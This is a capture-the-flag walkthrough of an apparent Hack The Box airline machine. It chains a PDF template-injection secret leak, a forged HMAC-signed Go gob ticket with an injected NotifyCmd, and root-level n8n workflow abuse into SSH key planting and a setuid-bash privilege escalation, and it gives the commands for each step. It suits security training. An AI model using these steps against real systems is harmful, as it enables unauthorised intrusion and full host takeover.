Exploiting SSTI in PDF Generation The boarding pass was downloaded:  curl -b web/cookies.txt \
  http://TARGET_IP/tickets/BOOKING_PNR/download \
  -o loot/ticket.pdf
The file was confirmed to be a valid PDF: file loot/ticket.pdf
Text was extracted with Poppler’s pdftotext: pdftotext -raw loot/ticket.pdf loot/ticket.txt
The disclosed environment included:  USER=www-data
HOME=/var/www
TICKET_VALIDATION_TOKEN=[REDACTED]
N8N_API_KEY=[REDACTED]
The value was extracted and decoded:  import base64
import html
import re

page = open("web/check-in.html", encoding="utf-8").read()
qr = re.search(r'name="qr_data" value="([^"]+)"', page).group(1)
raw = base64.b64decode(html.unescape(qr))

open("loot/ticket-qr.bin", "wb").write(raw)
open("loot/ticket-gob.bin", "wb").write(raw[:-32])
open("loot/ticket-signature.bin", "wb").write(raw[-32:])
The leaked ticket-validation token was used to verify the signature:  calculated = hmac.new(
    validation_key,
    gob_data,
    hashlib.sha256
).digest() 

The ticket was encoded as a Go gob object named:  *gob.VerifyTicketAuthenticity
The object contained one field:  type VerifyTicketAuthenticity struct {
    Data []byte
}
The Data field held JSON containing:  {
  "PNR": "BOOKING_PNR",
  "Token": "BOOKING_TOKEN",
  "Seat": "1A",
  "Passenger": "LAB_USER",
  "NotifyCmd": "check-in-notify ..."
}
The generated gob was compared with the legitimate ticket:  cmp -s generated-gob.bin original-gob.bin
Forging a Signed QR Ticket

A Python script was created to:

Build a JSON ticket object.
Set a controlled value in NotifyCmd.
Call the custom Go gob encoder.
Calculate an HMAC-SHA256 signature.
Append the signature to the gob data.
Base64-encode the completed ticket.
Submit it to /api/check-in.
The check-in endpoint accepted the correctly signed QR ticket.
A harmless callback was used first to confirm command execution. After command execution was verified, an interactive shell was obtained in the authorized lab environment.
The resulting shell ran as:  uid=33(www-data)
The working directory was the airline application directory:  /opt/htb-airways/booking
Enumeration from the www-data shell revealed:
The Go airline application
nginx
Docker
A local MySQL container
A locally exposed n8n service
Host users including kpark
An n8n API key in the airline service environment
The n8n service was available only through:  127.0.0.1:5678
The health endpoint confirmed that n8n was running:  curl http://127.0.0.1:5678/healthz
The n8n API listed existing workflows:  curl \
  -H "X-N8N-API-KEY: N8N_KEY" \
  http://127.0.0.1:5678/api/v1/workflows
A new workflow was created with two nodes:
A webhook trigger
An Execute Command node
The Execute Command node ran inside the n8n container as root.
The workflow was created through:  POST /api/v1/workflows
The returned workflow ID was captured and activated:  POST /api/v1/workflows/WORKFLOW_ID/activate
The webhook was then triggered:  curl http://127.0.0.1:5678/webhook/WORKFLOW_PATH
The output confirmed:  uid=0(root) gid=0(root)
The n8n container’s /root directory was not the host’s real /root. Instead, the host directory /home/kpark had been bind-mounted into the container as /root.
This meant:  Host:      /home/kpark Container: /root
Files written to /root by the container appeared in /home/kpark on the host.
The user flag was accessible through this shared directory and was recovered from the active machine. The value is intentionally omitted here:  User flag: [REDACTED]
A new Ed25519 SSH key pair was generated on the attacker system:  ssh-keygen -t ed25519 -N '' -f /tmp/kpark_key
The public key was placed into the mounted home directory using the root-running n8n workflow.
The required structure was:  /root/.ssh/authorized_keys
Because container /root mapped to host /home/kpark, the host saw:  /home/kpark/.ssh/authorized_keys
The correct permissions and ownership were applied:  /home/kpark/.ssh  700
/home/kpark/.ssh/authorized_keys   600
Owner   UID 1001, GID 1001
SSH access succeeded:  ssh -i /tmp/kpark_key \
  -o IdentitiesOnly=yes \
  -o PreferredAuthentications=publickey \
  -o PasswordAuthentication=no \
  kpark@TARGET_IP
The resulting identity was:  uid=1001(kpark) gid=1001(kpark)
Privilege Escalation Through the Shared Mount
As kpark, the host Bash executable was copied into the user’s home directory:  cp /bin/bash /home/kpark/pwnbash
Because /home/kpark was bind-mounted as /root inside the n8n container, the root-running n8n workflow could modify the same file through:  /root/pwnbash
The workflow changed its ownership and permissions:  chown root:root /root/pwnbash
chmod 4755 /root/pwnbash
Back in the kpark SSH session, the file appeared as:  -rwsr-xr-x 1 root root ... /home/kpark/pwnbash
The s in the owner execute position confirmed that the setuid bit was enabled.
The binary was executed with Bash’s privileged-mode option:  /home/kpark/pwnbash -p
The new shell showed an effective user ID of root:  uid=1001(kpark)
euid=0(root)
The root flag was then recovered from:  /root/root.txt 
The value is intentionally omitted:  Root flag: [REDACTED]


























